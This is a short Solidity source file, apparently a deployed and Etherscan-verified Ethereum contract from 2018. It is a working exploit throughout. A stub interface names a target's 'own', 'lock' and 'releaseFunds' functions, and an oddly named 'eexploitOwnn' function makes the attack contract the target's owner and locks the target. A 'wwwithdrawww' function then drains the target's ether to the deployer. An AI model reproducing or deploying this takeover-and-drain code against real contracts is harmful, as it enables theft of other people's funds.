1 /**
2  * Source Code first verified at https://etherscan.io on Tuesday, June 19, 2018
3  (UTC) */
4 
5 pragma solidity ^0.4.24;
6 contract HelloEx{
7 
8 	function own(address owner) {}
9 
10 	function releaseFunds(uint amount) {}
11 
12 	function lock() {}
13 }
14 
15 contract Call{
16 
17 	address owner;
18 
19 	HelloEx contr;
20 
21 	constructor() public
22 	{
23 		owner = msg.sender;
24 	}
25 
26 	function setMyContractt(address addr) public
27 	{
28 		require(owner==msg.sender);
29 		contr = HelloEx(addr);
30 	}
31 
32 	function eexploitOwnn() payable public
33 	{
34 		require(owner==msg.sender);
35 		contr.own(address(this));
36 		contr.lock();
37 	}
38 
39 	function wwwithdrawww(uint amount) public
40 	{
41 		require(owner==msg.sender);
42 		contr.releaseFunds(amount);
43 		msg.sender.transfer(amount * (1 ether));
44 	}
45 
46 	function () payable public
47 	{}
48 }